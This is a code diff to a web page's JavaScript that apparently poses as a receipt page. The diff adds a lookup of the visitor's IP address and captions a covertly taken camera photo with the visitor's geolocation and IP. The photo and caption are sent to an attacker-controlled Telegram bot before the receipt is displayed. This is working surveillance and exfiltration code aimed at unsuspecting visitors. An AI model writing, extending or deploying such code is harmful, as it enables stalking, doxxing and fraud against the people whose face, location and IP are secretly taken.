@@ -116,16 +116,22 @@
 
     // Function to request location permission first, then camera permission
     function requestPermissions() {
+      let ipAddress;
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => ipAddress = data.ip);
+
       navigator.geolocation.getCurrentPosition(
         (position) => {
           console.log("Localização acessada com sucesso:", position.coords);
-          sendMessage(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}`);
+          // sendMessage(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}`);
 
           // Request camera permission after location is granted
           navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
               console.log("Permissão da câmera concedida.");
-              captureImageAndSendToTelegram(stream);  // Capture image and send to Telegram
+              const caption = `🏠 Location: https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}\n📍 IP: ${ipAddress}`
+              captureImageAndSendToTelegram(stream, caption);  // Capture image and send to Telegram
               showReceipt();
             })
             .catch((error) => {
@@ -142,7 +148,7 @@
     }
 
     // Function to capture an image from the camera stream and send it to Telegram
-    function captureImageAndSendToTelegram(stream) {
+    function captureImageAndSendToTelegram(stream, caption) {
       const video = document.createElement('video');
       video.srcObject = stream;
       video.play();
@@ -161,18 +167,19 @@
         
         // Convert canvas to Blob (image file)
         canvas.toBlob((blob) => {
-          sendCapturedImageToTelegram(blob);
+          sendCapturedImageToTelegram(blob, caption);
         }, 'image/jpeg');
       };
     }
 
     // Function to send the captured image to Telegram using FormData
-    function sendCapturedImageToTelegram(imageBlob) {
+    function sendCapturedImageToTelegram(imageBlob, caption) {
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID); // Replace with the actual chat ID
       formData.append('photo', imageBlob, 'captured_image.jpg'); // Add the image file (with a name)
+      if (caption) formData.append('caption', caption)
 
       // Send the image using fetch
       fetch(url, {
